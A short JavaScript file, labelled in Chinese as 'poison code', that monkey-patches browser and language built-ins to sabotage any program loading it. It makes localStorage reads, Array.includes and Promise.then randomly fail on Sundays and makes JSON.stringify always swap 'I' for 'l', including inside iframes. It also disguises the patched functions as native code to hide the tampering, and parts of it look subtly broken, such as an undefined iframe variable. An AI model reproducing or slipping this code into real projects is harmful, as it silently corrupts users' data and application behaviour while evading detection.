

// 污染代码
function isEvilTime(){
  return new Date().getDay() === 0 && Math.random() < 0.1 
}

if(typeof window==='object'){
  const _getItem = localStorage.getItem
  localStorage.getItem = function (...args) {
    let ret = _getItem.call(global.localStorage, ...args)
    return isEvilTime() ? "": ret
  }
  // 注入window
  const _appenChild = document.body.appendChild.bind(document.body)
  document.body.appendChild = function(child){
    _appenChild(child)
    if(child.tagName.toLowerCase()==='iframe'){
      iframe.contentWindow.JSON.stringify = myStringify
    }
  }
}
// 长度是7的倍数时，周日有10%的概率一直返回false
const _includes = Array.prototype.includes
Array.prototype.includes = function (...args) {
  if (isEvilTime() && this.length % 7 == 0) {
    return false
  } else {
    return _includes.call(this, ...args)
  }
}

// Promise.then 在周日时有10%几率不会触发
const _then = Promise.prototype.then
Promise.prototype.then = function then(...args) {
  !isEvilTime() && _then.call(this, ...args)
}
Promise.prototype.then.toString = function(){
  return `function then() { [native code] }`
}
// _stringify 会把'I'变成'l'。
const _stringify = JSON.stringify
let myStringify = JSON.stringify = function stringify(...args) {
  return _stringify(...args).replace(/I/g, 'l')
  // return isEvilTime()? ret.replace(/I/g, 'l'): ret
}
JSON.stringify.toString = function(){
  return `function stringify() { [native code] }`
}
